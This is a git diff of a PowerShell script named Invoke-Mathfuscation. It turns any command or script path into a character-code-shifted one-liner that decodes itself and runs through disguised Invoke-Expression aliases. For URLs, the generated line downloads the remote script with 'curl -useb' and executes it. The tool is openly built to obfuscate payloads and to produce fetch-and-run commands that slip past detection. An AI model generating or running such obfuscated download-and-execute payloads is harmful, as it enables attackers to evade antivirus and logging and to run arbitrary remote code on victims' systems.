@@ -16,49 +16,72 @@
     None, user imput required when prompted. 
 #>
 
-$cow = " ______________________`n< Invoke-Mathfuscation >`n ----------------------`n        \   ^__^`n         \  (oo)\_______`n            (__)\       )\/\`n                ||----w |`n                ||     ||`n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`n"
-Write-Output $cow
+$plain = "Invoke-Mathfuscation" 
+$mfctd = "@(115,152,160,153,149,143,87,119,139,158,146,144,159,157,141,139,158,147,153,152)|%{$isXSw=$isXSw+[char]($_-42)};.(gcm ?e[?x])($isXSw)"
+
+foreach ($char in $plain.ToCharArray()) {
+    Write-Host -NoNewline $char -ForegroundColor green
+    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 120)
+}
+Write-Host ""
+Write-Host  -NoNewline " + 42 = " -ForegroundColor red
+
+foreach ($char in $mfctd.ToCharArray()) {
+    Write-Host -NoNewline $char -ForegroundColor yellow
+    Start-Sleep -Milliseconds (Get-Random -Minimum 1 -Maximum 15)
+}
+Write-Host "`n"
 
 $ErrorActionPreference = [System.Management.Automation.ActionPreference]::Stop
 
-$tochar = Read-Host -Prompt "Provide a command, full path to a .ps1 file (local or remote)"
+Do{
 
-$raw = $tochar.ToCharArray()
-$space = $tochar.ToCharArray() | %{([int][char]$_) }
+    $tochar = Read-Host -Prompt "Provide a command, full path to a .ps1 file (local or remote)"
 
-$com = $space -join ","
-$charCom = $space | ForEach-Object {"[char]$_"}
-$char = $charCom -join ","
+    $raw = $tochar.ToCharArray()
+    $space = $tochar.ToCharArray() | %{([int][char]$_) }
 
-Write-Host "`nConverted Char Values:"
-Write-Host $com -ForegroundColor Green
-Write-Host "`nConverted Char Values in [char] format:"
-Write-Host $char -ForegroundColor Green
+    $com = $space -join ","
+    $charCom = $space | ForEach-Object {"[char]$_"}
+    $char = $charCom -join ","
 
-Try{ 
-    [uint32]$shift = Read-Host -Prompt "`n`nWhat number should be added (int)?" -ErrorAction stop
-} 
-Catch [System.Net.WebException],[System.IO.IOException] { 
-    throw "Was this a number?" 
-    break
-}
 
-$added = $space | ForEach-Object {($_+$shift)}
-$charShift = $added | ForEach-Object {"[char]$_"}
-$modChar = $added -join ","
-
-Write-Host "`nModified Char Values:"
-Write-Host $modChar -ForegroundColor Cyan
-Write-Host "`nHere's your obfuscated payload!`n"
-
-$invokes = @('(ga`l ?[?e]x)','(gal ?[?e]x)','(gcm ?[?e]x)','(gcm ?[?e]x)','(gal ?e[?x])','(gcm ?e[?x])','(`ga`l i?[?x])','(g`cm i?[?x])')
-
-function CalcPayload() {
-    $randVar = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
-    if($tochar -clike 'http*') {
-        Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '(curl -useb $' + $randVar + ')') -ForegroundColor Yellow
-    } else {
-        Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '($' + $randVar + ')') -ForegroundColor Yellow
+    Try{ 
+        [uint32]$shift = Read-Host -Prompt "`n`nWhat number shoud be added (int)?" -ErrorAction stop
+    } 
+    Catch [System.Net.WebException],[System.IO.IOException] { 
+        throw "Was this a number?" 
+        break
     }
-}
-CalcPayload
+
+    $added = $space | ForEach-Object {($_+$shift)}
+    $charShift = $added | ForEach-Object {"[char]$_"}
+    $modChar = $added -join ","
+
+    Write-Host "`nHere's your obfuscated payload!`n" 
+
+    $invokes = @('(ga`l ?[?e]x)','(gal ?[?e]x)','(gcm ?[?e]x)','(gcm ?[?e]x)','(gal ?e[?x])','(gcm ?e[?x])','(`ga`l i?[?x])','(g`cm i?[?x])')
+
+    function CalcPayload() {
+        $randVar = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
+        if($tochar -clike 'http*') {
+            Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '(curl -useb $' + $randVar + ')') -ForegroundColor Yellow
+        } else {
+            Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '($' + $randVar + ')') -ForegroundColor Yellow
+        }
+    }
+
+    CalcPayload
+
+    Do{
+        $restart = Read-host "Do you want to mathfuscate another? (Y/N)"
+        If(($restart -eq "Y") -or ($restart -eq "N")){
+            $ver = $true}
+        Else{
+            write-host -fg Red "Invalid input. (Y/N)?"
+        }
+    }Until($ver)
+
+}Until($restart -eq "N")
+
+Write-Host "Bye!"
